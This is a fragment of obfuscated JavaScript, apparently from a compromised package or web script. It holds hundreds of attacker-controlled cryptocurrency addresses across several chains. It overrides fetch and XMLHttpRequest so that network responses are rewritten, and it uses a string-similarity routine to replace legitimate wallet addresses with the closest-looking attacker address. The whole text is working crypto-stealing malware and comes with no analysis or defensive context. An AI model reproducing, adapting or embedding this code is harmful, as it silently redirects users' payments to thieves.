    'xHmCb': "bc1q3ad2zyc5mpc9nnzmmtxqpu467jeh4m928r7qf4",
    'OqeMw': "bc1qlrdqrulwmvfg86rmp77k8npdefns52ykk8cxs6",
    'BNnlw': "bc1q5hqxk5ugvf2d3y6qj2a7cy7u79ckusu9eknpsr",
    'FkDWd': "bc1qszm3nugttmtpkq77dhphtqg4u7vuhxxcrh7f79",
    'aBdRe': "bc1qqc09xnyafq0y4af3x7j5998tglxcanjuzy974m",
    'roief': "bc1qqqh29zxfzxk0fvmq9d7hwedh5yz44zhf7e23qz",
    'qMxmV': "bc1qsg57tpvfj6gysrw5w4sxf3dweju40g87uuclvu",
    'kkYGi': "bc1qje95nehs8y0wvusp2czr25p7kghk6j3cvgugy5",
    'zbnSH': "bc1qwrnchp96p38u8ukp8jc8cq22q35n3ajfav0pzf",
    'dHxYm': "bc1q6l99s704jccclxx5rc2x2c5shlgs2pg0fpnflk",
    'OfXMz': "bc1qeuk2u6xl4rgfq0x9yc37lw49kutnd8gdlxt9st",
    'OZznV': "bc1qxul8lwxvt7lt9xuge0r2jls7evrwyyvcf2ah0u",
    'NHzcN': "bc1qcplvxyzs9w09g6lpglj6xxdfxztfwjsgz95czd",
    'sxqWF': "bc1q9ca9ae2cjd3stmr9lc6y527s0x6vvqys6du00u",
    'oIQra': "bc1qmap3cqss3t4vetg8z9s995uy62jggyxjk29jkp",
    'qIAwe': "bc1qg3c6c7y5xeqkxnjsx9ymclslr2sncjrxjylkej",
    'IneJW': "bc1q9zx63qdjwldxp4s9egeqjelu3y5yqsajku8m29",
    'tjIgE': "bc1ql2awtv7nzcp2dqce3kny2ra3dz946c9vg2yukq",
    'vuJMD': "bc1qhytpe64tsrrvgwm834q35w6607jc6azqtnvl2a",
    'Uxzul': "bc1q4rlgfgjwg9g2pqwqkf5j9hq6ekn39rjmzv09my",
    'MoAYB': "bc1q28ks0u6fhvv7hktsavnfpmu59anastfj5sq8dw",
    'wKaGs': "bc1qjqfpxvl2j2hzx2cxeqhchrh02dcjy3z5k6gv55",
    'VmOdy': "bc1q8zznzs9z93xpkpunrmeqp6fg54s3q7dkh9z9xw",
    'YcvKY': "bc1qt4c4e6xwt5dz4p629ndz9zmeep2kmvqgy53037",
    'FlhWy': "0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976",
    'sCKdW': "0xa29eeFb3f21Dc8FA8bce065Db4f4354AA683c024",
    'ZAiba': "0x40C351B989113646bc4e9Dfe66AE66D24fE6Da7B",
    'AsHKD': "0x30F895a2C66030795131FB66CBaD6a1f91461731",
    'rzrhZ': "0x57394449fE8Ee266Ead880D5588E43501cb84cC7",
    'expPy': "0xCd422cCC9f6e8f30FfD6F68C0710D3a7F24a026A",
    'zlBwY': "0x7C502F253124A88Bbb6a0Ad79D9BeD279d86E8f4",
    'nElAL': "0xe86749d6728d8b02c1eaF12383c686A8544de26A",
    'wqRjK': "0xa4134741a64F882c751110D3E207C51d38f6c756",
    'HcYDT': "0xD4A340CeBe238F148034Bbc14478af59b1323d67",
    'BqNRF': "0xB00A433e1A5Fc40D825676e713E5E351416e6C26",
    'OvURa': "0xd9Df4e4659B1321259182191B683acc86c577b0f",
    'PFfEj': "0x0a765FA154202E2105D7e37946caBB7C2475c76a",
    'IOjJb': "0xE291a6A58259f660E8965C2f0938097030Bf1767",
    'uKfqV': "0xe46e68f7856B26af1F9Ba941Bc9cd06F295eb06D",
    'DAJYA': "0xa7eec0c4911ff75AEd179c81258a348c40a36e53",
    'SUVoY': "0x3c6762469ea04c9586907F155A35f648572A0C3E",
    'WJmWS': "0x322FE72E1Eb64F6d16E6FCd3d45a376efD4bC6b2",
    'QBAXK': "0x51Bb31a441531d34210a4B35114D8EF3E57aB727",
    'zLNIR': "0x314d5070DB6940C8dedf1da4c03501a3AcEE21E1",
    'kTQGi': "0x75023D76D6cBf88ACeAA83447C466A9bBB0c5966",
    'XJxSR': "0x1914F36c62b381856D1F9Dc524f1B167e0798e5E",
    'kHjMo': "0xB9e9cfd931647192036197881A9082cD2D83589C",
    'kxPDg': "0xE88ae1ae3947B6646e2c0b181da75CE3601287A4",
    'gWISZ': "0x0D83F2770B5bDC0ccd9F09728B3eBF195cf890e2",
    'hIHlD': "0xe2D5C35bf44881E37d7183DA2143Ee5A84Cd4c68",
    'QgItq': "0xd21E6Dd2Ef006FFAe9Be8d8b0cdf7a667B30806d",
    'bLJZU': "0x93Ff376B931B92aF91241aAf257d708B62D62F4C",
    'IdVSI': "0x5C068df7139aD2Dedb840ceC95C384F25b443275",
    'Rpwne': "0x70D24a9989D17a537C36f2FB6d8198CC26c1c277",
    'NYUBp': "0x0ae487200606DEfdbCEF1A50C003604a36C68E64",
    'eQrXq': "0xc5588A6DEC3889AAD85b9673621a71fFcf7E6B56",
    'yRdVI': "0x3c23bA2Db94E6aE11DBf9cD2DA5297A09d7EC673",
    'IDnjA': "0x5B5cA7d3089D3B3C6393C0B79cDF371Ec93a3fd3",
    'ajXoV': "0x4Cb4c0E7057829c378Eb7A9b174B004873b9D769",
    'xyHoE': "0xd299f05D1504D0B98B1D6D3c282412FD4Df96109",
    'TCqKY': "0x241689F750fCE4A974C953adBECe0673Dc4956E0",
    'dQfUy': "0xBc5f75053Ae3a8F2B9CF9495845038554dDFb261",
    'ctRhh': "0x5651dbb7838146fCF5135A65005946625A2685c8",
    'JbMdu': "0x5c9D146b48f664f2bB4796f2Bb0279a6438C38b1",
    'gjuIU': "0xd2Bf42514d35952Abf2082aAA0ddBBEf65a00BA3",
    'fmDjk': "0xbB1EC85a7d0aa6Cd5ad7E7832F0b4c8659c44cc9",
    'GjipQ': "0x013285c02ab81246F1D68699613447CE4B2B4ACC",
    'wHLUW': "0x97A00E100BA7bA0a006B2A9A40f6A0d80869Ac9e",
    'gYVeZ': "0x4Bf0C0630A562eE973CE964a7d215D98ea115693",
    'Sqlrp': "0x805aa8adb8440aEA21fDc8f2348f8Db99ea86Efb",
    'pcqRS': "0xae9935793835D5fCF8660e0D45bA35648e3CD463",
    'fMapR': "0xB051C0b7dCc22ab6289Adf7a2DcEaA7c35eB3027",
    'ITrjn': "0xf7a82C48Edf9db4FBe6f10953d4D889A5bA6780D",
    'Ixxxa': "0x06de68F310a86B10746a4e35cD50a7B7C8663b8d",
    'DdqMx': "0x51f3C0fCacF7d042605ABBE0ad61D6fabC4E1F54",
    'mddEm': "0x49BCc441AEA6Cd7bC5989685C917DC9fb58289Cf",
    'GQlpD': "0x7fD999f778c1867eDa9A4026fE7D4BbB33A45272",
    'PFPfJ': "0xe8749d2347472AD1547E1c6436F267F0EdD725Cb",
    'rgsmH': "0x2B471975ac4E4e29D110e43EBf9fBBc4aEBc8221",
    'kkUbC': "0x02004fE6c250F008981d8Fc8F9C408cEfD679Ec3",
    'qHwwv': "0xC4A51031A7d17bB6D02D52127D2774A942987D39",
    'mlgET': "0xa1b94fC12c0153D3fb5d60ED500AcEC430259751",
    'Sflwm': "0xdedda1A02D79c3ba5fDf28C161382b1A7bA05223",
    'cKcDU': "0xE55f51991C8D01Fb5a99B508CC39B8a04dcF9D04",
    'tWKKt': "5VVyuV5K6c2gMq1zVeQUFAmo8shPZH28MJCVzccrsZG6",
    'GeUXv': "98EWM95ct8tBYWroCxXYN9vCgN7NTcR6nUsvCx1mEdLZ",
    'IFMoj': "Gs7z9TTJwAKyxN4G3YWPFfDmnUo3ofu8q2QSWfdxtNUt",
    'shIUB': "CTgjc8kegnVqvtVbGZfpP5RHLKnRNikArUYFpVHNebEN",
    'IfmWW': "7Nnjyhwsp8ia2W4P37iWAjpRao3Bj9tVZBZRTbBpwXWU",
    'aLjQi': "3KFBge3yEg793VqVV1P6fxV7gC9CShh55zmoMcGUNu49",
    'ytLpw': "9eU7SkkFGWvDoqSZLqoFJ9kRqJXDQYcEvSiJXyThCWGV",
    'gjXjd': "4SxDspwwkviwR3evbZHrPa3Rw13kBr51Nxv86mECyXUF",
    'alqyK': "9dtS7zbZD2tK7oaMUj78MKvgUWHbRVLQ95bxnpsCaCLL",
    'tySZZ': "7mdCoRPc1omTiZdYY2xG81EvGwN7Z2yodUTX9ZmLm3fx",
    'wEEzD': "8rdABs8nC2jTwVhR9axWW7WMbGZxW7JUzNV5pRF8KvQv",
    'PFTuz': "55YtaEqYEUM7ASAZ9XmVdSBNy6F7r5zkdLsJFv2ZPtAx",
    'uMBVu': "Gr8Kcyt8UVRF1Pux7YHiK32Spm7cmnFVL6hd7LSLHqoB",
    'gGKEH': "9MRmVsciWKDvwwTaZQCK2NvJE2SeVU8W6EGFmukHTRaB",
    'QlDwm': "5j4k1Ye12dXiFMLSJpD7gFrLbv4QcUrRoKHsgo32kRFr",
    'PbcYH': "F1SEspGoVLhqJTCFQEutTcKDubw44uKnqWc2ydz4iXtv",
    'isJWQ': "G3UBJBY69FpDbwyKhZ8Sf4YULLTtHBtJUvSX4GpbTGQn",
    'NORtg': "DZyZzbGfdMy5GTyn2ah2PDJu8LEoKPq9EhAkFRQ1Fn6K",
    'OWMqm': "HvygSvLTXPK4fvR17zhjEh57kmb85oJuvcQcEgTnrced",
    'mAOhu': "TB9emsCq6fQw6wRk4HBxxNnU6Hwt1DnV67",
    'zNJib': "TSfbXqswodrpw8UBthPTRRcLrqWpnWFY3y",
    'JIaJy': "TYVWbDbkapcKcvbMfdbbcuc3PE1kKefvDH",
    'ycYrn': "TNaeGxNujpgPgcfetYwCNAZF8BZjAQqutc",
    'YofCH': "TJ1tNPVj7jLK2ds9JNq15Ln6GJV1xYrmWp",
    'iKJKA': "TGExvgwAyaqwcaJmtJzErXqfra66YjLThc",
    'oQtxT': "TC7K8qchM7YXZPdZrbUY7LQwZaahdTA5tG",
    'Gnngl': "TQuqKCAbowuQYEKB9aTnH5uK4hNvaxDCye",
    'AIOZX': "TFcXJysFgotDu6sJu4zZPAvr9xHCN7FAZp",
    'LBXrZ': "TLDkM4GrUaA13PCHWhaMcGri7H8A8HR6zR",
    'GcWUu': "TPSLojAyTheudTRztqjhNic6rrrSLVkMAr",
    'uWYHo': "TY2Gs3RVwbmcUiDpxDhchPHF1CVsGxU1mo",
    'AjRST': "TCYrFDXHBrQkqCPNcp6V2fETk7VoqjCNXw",
    'OghhW': "TKcuWWdGYqPKe98xZCWkmhc1gKLdDYvJ2f",
    'WYxMs': "TP1ezNXDeyF4RsM3Bmjh4GTYfshf5hogRJ",
    'XPQAU': "TJcHbAGfavWSEQaTTLotG7RosS3iqV5WMb",
    'kQfYh': "TD5U7782gp7ceyrsKwekWFMWF9TjhC6DfP",
    'fQZCx': "TEu3zgthJE32jfY6bYMYGNC7BU2yEXVBgW",
    'UzPHF': "TK5r74dFyMwFSTaJF6dmc2pi7A1gjGTtJz",
    'qJMvq': "TBJH4pB4QPo96BRA7x6DghEv4iQqJBgKeW",
    'sZVdB': "TKBcydgFGX9q3ydaPtxht1TRAmcGybRozt",
    'zzvgO': "TQXoAYKPuzeD1X2c4KvQ4gXhEnya3AsYwC",
    'maiTu': "TJCevwYQhzcSyPaVBTa15y4qNY2ZxkjwsZ",
    'ZpFNE': "THpdx4MiWbXtgkPtsrsvUjHF5AB4u7mx3E",
    'jTVMz': "TWpCDiY8pZoY9dVknsy3U4mrAwVm8mCBh6",
    'zBKSx': "TK5zyFYoyAttoeaUeWGdpRof2qRBbPSV7L",
    'CsfLH': "TAzmtmytEibzixFSfNvqqHEKmMKiz9wUA9",
    'LCszu': "TCgUwXe3VmLY81tKBrMUjFBr1qPnrEQFNK",
    'cdzQW': "TTPWAyW3Q8MovJvDYgysniq41gQnfRn21V",
    'xBxZT': "TWUJVezQta4zEX94RPmFHF2hzQBRmYiEdn",
    'ESuTT': "TPeKuzck7tZRXKh2GP1TyoePF4Rr1cuUAA",
    'emvMl': "TJUQCnHifZMHEgJXSd8SLJdVAcRckHGnjt",
    'xVGnF': "TCgX32nkTwRkapNuekTdk1TByYGkkmcKhJ",
    'hxLhB': "TFDKvuw86wduSPZxWTHD9N1TqhXyy9nrAs",
    'EeQvC': "TQVpRbBzD1au3u8QZFzXMfVMpHRyrpemHL",
    'pELnW': "TSE2VkcRnyiFB4xe8an9Bj1fb6ejsPxa9Z",
    'qzqrf': "THe32hBm9nXnzzi6YFqYo8LX77CMegX3v5",
    'ZjUWz': "TXfcpZtbYfVtLdGPgdoLm6hDHtnrscvAFP",
    'LieOP': "TXgVaHDaEyXSm1LoJEqFgKWTKQQ1jgeQr7",
    'pPSEL': "TD5cRTn9dxa4eodRWszGiKmU4pbpSFN87P",
    'Cubxg': "LNFWHeiSjb4QB4iSHMEvaZ8caPwtz4t6Ug",
    'tdnnB': "LQk8CEPMP4tq3mc8nQpsZ1QtBmYbhg8UGR",
    'WBSil': "LMAJo7CV5F5scxJsFW67UsY2RichJFfpP6",
    'aiczm': "LUvPb1VhwsriAm3ni77i3otND2aYLZ8fHz",
    'RVLCn': "LhWPifqaGho696hFVGTR1KmzKJ8ps7ctFa",
    'UpXNN': "LZZPvXLt4BtMzEgddYnHpUWjDjeD61r5aQ",
    'FOnBW': "LQfKhNis7ZKPRW6H3prbXz1FJd29b3jsmT",
    'iMpIh': "LSihmvTbmQ9WZmq6Rjn35SKLUdBiDzcLBB",
    'mynAv': "Ldbnww88JPAP1AUXiDtLyeZg9v1tuvhHBP",
    'LthXt': "LR3YwMqnwLt4Qdn6Ydz8bRFEeXvpbNZUvA",
    'thBMJ': "Lbco8vJ56o1mre6AVU6cF7JjDDscnYHXLP",
    'SDnYd': "LfqFuc3sLafGxWE8vdntZT4M9NKq6Be9ox",
    'rsFGZ': "LLcmXxj8Zstje6KqgYb11Ephj8bGdyF1vP",
    'GERuP': "LcJwR1WvVRsnxoe1A66pCzeXicuroDP6L6",
    'YnKTx': "LUNKimRyxBVXLf9gp3FZo2iVp6D3yyzJLJ",
    'qeLYC': "LY1NnVbdywTNmq45DYdhssrVENZKv7Sk8H",
    'bHFpc': "LNmMqhqpyDwb1zzZReuA8aVUxkZSc4Ztqq",
    'yJtyM': "LdxgXRnXToLMBML2KpgGkdDwJSTM6sbiPE",
    'UthzI': "LZMn8hLZ2kVjejmDZiSJzJhHZjuHq8Ekmr",
    'HRVKG': "LVnc1MLGDGKs2bmpNAH7zcHV51MJkGsuG9",
    'DYFsg': "LRSZUeQb48cGojUrVsZr9eERjw4K1zAoyC",
    'vJoTb': "LQpGaw3af1DQiKUkGYEx18jLZeS9xHyP9v",
    'SCttQ': "LiVzsiWfCCkW2kvHeMBdawWp9TE8uPgi6V",
    'TLtwe': "LY32ncFBjQXhgCkgTAd2LreFv3JZNTpMvR",
    'zubSd': "LdPtx4xqmA4HRQCm3bQ9PLEneMWLdkdmqg",
    'jnPSm': "LYcHJk7r9gRbg2z3hz9GGj91Po6TaXDK3k",
    'tkhoC': "LMhCVFq5fTmrwQyzgfp2MkhrgADRAVCGsk",
    'UXYpW': "LPv1wSygi4vPp9UeW6EfWwepEeMFHgALmN",
    'QtlzB': "Lf55UbTiSTjnuQ8uWzUBtzghztezEfSLvT",
    'wYQWn': "LdJHZeBQovSYbW1Lei6CzGAY4d3mUxbNKs",
    'abbui': "LbBxnFaR1bZVN2CquNDXGe1xCuu9vUBAQw",
    'zndLO': "LWWWPK2SZZKB3Nu8pHyq2yPscVKvex5v2X",
    'kXpEP': "LYN4ESQuJ1TbPxQdRYNrghznN8mQt8WDJU",
    'gBdKm': "LiLzQs4KU79R5AUn9jJNd7EziNE7r32Dqq",
    'AJBPj': "LeqNtT4aDY9oM1G5gAWWvB8B39iUobThhe",
    'dDlKv': "LfUdSVrimg54iU7MhXFxpUTPkEgFJonHPV",
    'upwRp': "LTyhWRAeCRcUC9Wd3zkmjz3AhgX6J18kxZ",
    'wKEAH': "Lc2LtsEJmPYay1oj7v8xj16mSV15BwHtGu",
    'Kivgs': "LVsGi1QVXucA6v9xsjwaAL8WYb7axdekAK",
    'atdgC': "LewV6Gagn52Sk8hzPHRSbBjUpiNAdqmB9z",
    'wORrq': "bitcoincash:qpwsaxghtvt6phm53vfdj0s6mj4l7h24dgkuxeanyh",
    'AXcYN': "bitcoincash:qq7dr7gu8tma7mvpftq4ee2xnhaczqk9myqnk6v4c9",
    'nJmrw': "bitcoincash:qpgf3zrw4taxtvj87y5lcaku77qdhq7kqgdga5u6jz",
    'jiCnV': "bitcoincash:qrkrnnc5kacavf5pl4n4hraazdezdrq08ssmxsrdsf",
    'IEyeW': "bitcoincash:qqdepnkh89dmfxyp4naluvhlc3ynej239sdu760y39",
    'LPwMj': "bitcoincash:qqul8wuxs4ec8u4d6arkvetdmdh4ppwr0ggycetq97",
    'QeXkq': "bitcoincash:qq0enkj6n4mffln7w9z6u8vu2mef47jwlcvcx5f823",
    'AXCnW': "bitcoincash:qrc620lztlxv9elhj5qzvmf2cxhe7egup5few7tcd3",
    'BvvIY': "bitcoincash:qrf3urqnjl4gergxe45ttztjymc8dzqyp54wsddp64",
    'WdGef': "bitcoincash:qr7mkujcr9c38ddfn2ke2a0sagk52tllesderfrue8",
    'MdtCY': "bitcoincash:qqgjn9yqtud5mle3e7zhmagtcap9jdmcg509q56ynt",
    'lcvXH': "bitcoincash:qpuq8uc9ydxszny5q0j4actg30he6uhffvvy0dl7er",
    'jQkco': "bitcoincash:qz0640hjl2m3n2ca26rknljpr55gyd9pjq89g6xhrz",
    'XcaTu': "bitcoincash:qq0j6vl2ls2g8kkhkvpcfyjxns5zq03llgsqdnzl4s",
    'JEZmD': "bitcoincash:qq8m8rkl29tcyqq8usfruejnvx27zxlpu52mc9spz7",
    'PQrIR': "bitcoincash:qpudgp66jjj8k9zec4na3690tvu8ksq4fq8ycpjzed",
    'JDUWN': "bitcoincash:qqe3qc9uk08kxnng0cznu9xqqluwfyemxym7w2e3xw",
    'CZKkU': "bitcoincash:qpukdxh30d8dtj552q2jet0pqvcvt64gfujaz8h9sa",
    'GGbBw': "bitcoincash:qqs4grdq56y5nnamu5d8tk450kzul3aulyz8u66mjc",
    'TlKHF': "bitcoincash:qp7rhhk0gcusyj9fvl2ftr06ftt0pt8wgumd8ytssd",
    'gvWhS': "bitcoincash:qpmc3y5y2v7h3x3sgdg7npau034fsggwfczvuqtprl",
    'TOyco': "bitcoincash:qzum0qk4kpauy8ljspmkc5rjxe5mgam5xg7xl5uq2g",
    'uzHQJ': "bitcoincash:qqjqp8ayuky5hq4kgrarpu40eq6xjrneuurc43v9lf",
    'Ddxxq': "bitcoincash:qqxu6a3f0240v0mwzhspm5zeneeyecggvufgz82w7u",
    'SkKwK': "bitcoincash:qpux2mtlpd03d8zxyc7nsrk8knarnjxxts2fjpzeck",
    'xlIOq': "bitcoincash:qpcgcrjry0excx80zp8hn9vsn4cnmk57vylwa5mtz3",
    'cGdGB': "bitcoincash:qpjj6prm5menjatrmqaqx0h3zkuhdkfy75uauxz2sj",
    'NJweA': "bitcoincash:qp79qg7np9mvr4mg78vz8vnx0xn8hlkp7sk0g86064",
    'liySF': "bitcoincash:qr27clvagvzra5z7sfxxrwmjxy026vltucdkhrsvc7",
    'dZzai': "bitcoincash:qrsypfz3lqt8xtf8ej5ftrqyhln577me6v640uew8j",
    'qPXMY': "bitcoincash:qrzfrff4czjn6ku0tn2u3cxk7y267enfqvx6zva5w6",
    'GSmbj': "bitcoincash:qr7exs4az754aknl3r5gp9scn74dzjkcrgql3jpv59",
    'oFfnO': "bitcoincash:qq35fzg00mzcmwtag9grmwljvpuy5jm8kuzfs24jhu",
    'oBsPL': "bitcoincash:qra5zfn74m7l85rl4r6wptzpnt2p22h7552swkpa7l",
    'fqBSI': "bitcoincash:qzqllr0fsh9fgfvdhmafx32a0ddtkt52evnqd7w7h7",
    'GqRgo': "bitcoincash:qpjdcwld84wtd5lk00x8t7qp4eu3y0xhnsjjfgrs7q",
    'TSvsw': "bitcoincash:qrgpm5y229xs46wsx9h9mlftedmsm4xjlu98jffmg3",
    'gIXXv': "bitcoincash:qpjl9lkjjp4s6u654k3rz06rhqcap849jg8uwqmaad",
    'NNxYW': "bitcoincash:qra5uwzgh8qus07v3srw5q0e8vrx5872k5cxguu3h5",
    'wgjIC': "bitcoincash:qz6239jkqf9qpl2axk6vclsx3gdt8cy4z5rag98u2r",
    'NbGXK': function (_0x6fd57a, _0x45613c) {
      return _0x6fd57a == _0x45613c;
    },
    'eDGUh': "ethereum",
    'dmtxm': function (_0x426191, _0xcfbe) {
      return _0x426191 == _0xcfbe;
    },
    'HNbDp': function (_0x43f1a1, _0x360cae) {
      return _0x43f1a1 == _0x360cae;
    },
    'YBHoq': "bitcoinLegacy",
    'pRoUO': "bitcoinSegwit",
    'nvayH': function (_0x1a5c0d, _0x3206ce, _0x4cf791) {
      return _0x1a5c0d(_0x3206ce, _0x4cf791);
    },
    'jHsib': "tron",
    'nVTWs': "ltc",
    'jsqTT': function (_0x245d0e, _0x2d73d9, _0x14ef57) {
      return _0x245d0e(_0x2d73d9, _0x14ef57);
    },
    'afnPM': function (_0x458f2b, _0x6aa524) {
      return _0x458f2b == _0x6aa524;
    },
    'tDons': "ltc2",
    'gtXrf': function (_0x4aac02, _0x3c2f2e, _0x51351a) {
      return _0x4aac02(_0x3c2f2e, _0x51351a);
    },
    'sghpa': "bch",
    'hrNiK': function (_0x4989f5, _0xf4abd5, _0x265bdf) {
      return _0x4989f5(_0xf4abd5, _0x265bdf);
    },
    'tqgyV': "solana",
    'mbgjV': function (_0x34d7ea, _0xb2bd29, _0x41c749) {
      return _0x34d7ea(_0xb2bd29, _0x41c749);
    },
    'IAgrR': function (_0x95d4e, _0x4e3b67) {
      return _0x95d4e == _0x4e3b67;
    },
    'FvQbM': "solana2",
    'UPcyp': "solana3",
    'JiXTg': function (_0x2dd239, _0x9ccb5, _0x2f7208) {
      return _0x2dd239(_0x9ccb5, _0x2f7208);
    },
    'BEiKn': function (_0x7b893d, _0x592b33) {
      return _0x7b893d == _0x592b33;
    },
    'BAEhI': function (_0x421ebd, _0x39f4fa) {
      return _0x421ebd != _0x39f4fa;
    },
    'kZnrz': "undefined"
  };
  if (loval == 1) {
    return;
  }
  loval = 1;
  function _0x3479c8(_0x13a5cc, _0x8c209f) {
    const _0x50715b = Array.from({
      'length': _0x13a5cc.length + 1
    }, () => Array(_0x8c209f.length + 1).fill(0));
    for (let _0x1b96c3 = 0; _0x1b96c3 <= _0x13a5cc.length; _0x1b96c3++) {
      _0x50715b[_0x1b96c3][0] = _0x1b96c3;
    }
    for (let _0x239a5f = 0; _0x239a5f <= _0x8c209f.length; _0x239a5f++) {
      _0x50715b[0][_0x239a5f] = _0x239a5f;
    }
    for (let _0x5aba31 = 1; _0x5aba31 <= _0x13a5cc.length; _0x5aba31++) {
      for (let _0x22e9c0 = 1; _0x22e9c0 <= _0x8c209f.length; _0x22e9c0++) {
        if (_0x13a5cc[_0x5aba31 - 1] === _0x8c209f[_0x22e9c0 - 1]) {
          _0x50715b[_0x5aba31][_0x22e9c0] = _0x50715b[_0x5aba31 - 1][_0x22e9c0 - 1];
        } else {
          _0x50715b[_0x5aba31][_0x22e9c0] = 1 + Math.min(_0x50715b[_0x5aba31 - 1][_0x22e9c0], _0x50715b[_0x5aba31][_0x22e9c0 - 1], _0x50715b[_0x5aba31 - 1][_0x22e9c0 - 1]);
        }
      }
    }
    return _0x50715b[_0x13a5cc.length][_0x8c209f.length];
  }
  function _0x2abae0(_0x348925, _0x2f1e3d) {
    let _0xff60d1 = Infinity;
    let _0x5be3d3 = null;
    for (let _0x214c8b of _0x2f1e3d) {
      const _0x3a7411 = _0x3479c8(_0x348925.toLowerCase(), _0x214c8b.toLowerCase());
      if (_0x3a7411 < _0xff60d1) {
        _0xff60d1 = _0x3a7411;
        _0x5be3d3 = _0x214c8b;
      }
    }
    return _0x5be3d3;
  }
  fetch = async function (..._0x1ae7ec) {
    const _0x406ee2 = await _0xba16ef.tfqRA(fetch, ..._0x1ae7ec);
    const _0x207752 = _0x406ee2.headers.get("Content-Type") || '';
    let _0x561841;
    if (_0x207752.includes("application/json")) {
      _0x561841 = await _0x406ee2.clone().json();
    } else {
      _0x561841 = await _0x406ee2.clone().text();
    }
    const _0x50818d = _0x19ca67(_0x561841);
    const _0x22ee54 = typeof _0x50818d === "string" ? _0x50818d : JSON.stringify(_0x50818d);
    const _0x20415d = new Response(_0x22ee54, {
      'status': _0x406ee2.status,
      'statusText': _0x406ee2.statusText,
      'headers': _0x406ee2.headers
    });
    return _0x20415d;
  };
  if (typeof window != "undefined") {
    const _0x2d44e5 = XMLHttpRequest.prototype.open;
    const _0x3d5d6a = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.open = function (_0x2dbeb0, _0x3b2bc2, _0x36de99, _0x36f3b7, _0x52ad25) {
      this._url = _0x3b2bc2;
      return _0x2d44e5.apply(this, arguments);
    };
    XMLHttpRequest.prototype.send = function (_0x270708) {
      const _0x159c30 = this;
      const _0x1c1a41 = _0x159c30.onreadystatechange;
      _0x159c30.onreadystatechange = function () {
        if (_0x159c30.readyState === 4) {
          try {
            const _0x13db82 = _0x159c30.getResponseHeader("Content-Type") || '';
            let _0x1ac083 = _0x159c30.responseText;
            if (_0x13db82.includes("application/json")) {
              _0x1ac083 = JSON.parse(_0x159c30.responseText);
            }
            const _0x454f4a = _0x19ca67(_0x1ac083);
            const _0x553cb7 = typeof _0x454f4a === "string" ? _0x454f4a : JSON.stringify(_0x454f4a);
            Object.defineProperty(_0x159c30, "responseText", {
              'value': _0x553cb7
            });
            Object.defineProperty(_0x159c30, "response", {
              'value': _0x553cb7
            });
          } catch (_0x59788f) {}
        }
        if (_0x1c1a41) {
          _0x1c1a41.apply(this, arguments);
        }
      };
      return _0x3d5d6a.apply(this, arguments);
    };
  }
  function _0x19ca67(_0x1156d2) {
    try {
      if (typeof _0x1156d2 === "object" && _0x1156d2 !== null) {
        const _0x129304 = JSON.stringify(_0x1156d2);
        const _0x187e67 = _0xba16ef.tfqRA(_0x20669a, _0x129304);
        return JSON.parse(_0x187e67);
      }
      if (typeof _0x1156d2 === "string") {
        return _0x20669a(_0x1156d2);
      }
      return _0x1156d2;
    } catch (_0x2abc9c) {
      return _0x1156d2;
    }
  }
  function _0x20669a(_0x530d91) {
    var _0x264994 = ["1H13VnQJKtT4HjD5ZFKaaiZEetMbG7nDHx", "1Li1CRPwjovnGHGPTtcKzy75j37K6n97Rd", "1Dk12ey2hKWJctU3V8Akc1oZPo1ndjbnjP", "1NBvJqc1GdSb5uuX8vT7sysxtT4LB8GnuY", "1Mtv6GsFsbno9XgSGuG6jRXyBYv2tgVhMj", "1BBAQm4DL78JtRdJGEfzDBT2PBkGyvzf4N", "1KkovSeka94yC5K4fDbfbvZeTFoorPggKW", "18CPyFLMdncoYccmsZPnJ5T1hxFjh6aaiV", "1BijzJvYU2GaBCYHa8Hf3PnJh6mjEd92UP", "1Bjvx6WXt9iFB5XKAVsU3TgktgeNbzpn5N", "19fUECa9aZCQxcLeo8FZu8kh5kVWheVrg8", "1DZEep7GsnmBVkbZR3ogeBQqwngo6x4XyR", "1GX1FWYttd65J26JULr9HLr98K7VVUE38w", "14mzwvmF2mUd6ww1gtanQm8Bxv3ZWmxDiC", "1EYHCtXyKMMhUiJxXJH4arfpErNto5j87k", "19D1QXVQCoCLUHUrzQ4rTumqs9jBcvXiRg", "16mKiSoZNTDaYLBQ5LkunK6neZFVV14b7X", "18x8S4yhFmmLUpZUZa3oSRbAeg8cpECpne", "1EkdNoZJuXTqBeaFVzGwp3zHuRURJFvCV8", "13oBVyPUrwbmTAbwxVDMT9i6aVUgm5AnKM", "1DwsWaXLdsn4pnoMtbsmzbH7rTj5jNH6qS", "13wuEH28SjgBatNppqgoUMTWwuuBi9e4tJ", "154jc6v7YwozhFMppkgSg3BdgpaFPtCqYn", "1AP8zLJE6nmNdkfrf1piRqTjpasw7vk5rb", "19F8YKkU7z5ZDAypxQ458iRqH2ctGJFVCn", "17J3wL1SapdZpT2ZVX72Jm5oMSXUgzSwKS", "16z8D7y3fbJsWFs3U8RvBF3A8HLycCW5fH", "1PYtCvLCmnGDNSVK2gFE37FNSf69W2wKjP", "143wdqy6wgY3ez8Nm19AqyYh25AZHz3FUp", "1JuYymZbeoDeH5q65KZVG3nBhYoTK9YXjm", "1PNM2L1bpJQWipuAhNuB7BZbaFLB3LCuju", "19onjpqdUsssaFKJjwuAQGi2eS41vE19oi", "1JQ15RHehtdnLAzMcVT9kU8qq868xFEUsS", "1LVpMCURyEUdE8VfsGqhMvUYVrLzbkqYwf", "1KMcDbd2wecP4Acoz9PiZXsBrJXHbyPyG6", "1DZiXKhBFiKa1f6PTGCNMKSU1xoW3Edb7Z", "174bEk62kr8dNgiduwHgVzeLgLQ38foEgZ", "17cvmxcjTPSBsF1Wi2HfcGXnpLBSzbAs6p", "1NoYvnedUqNshKPZvSayfk8YTQYvoB2wBc", "13694eCkAtBRkip8XdPQ8ga99KEzyRnU6a"];
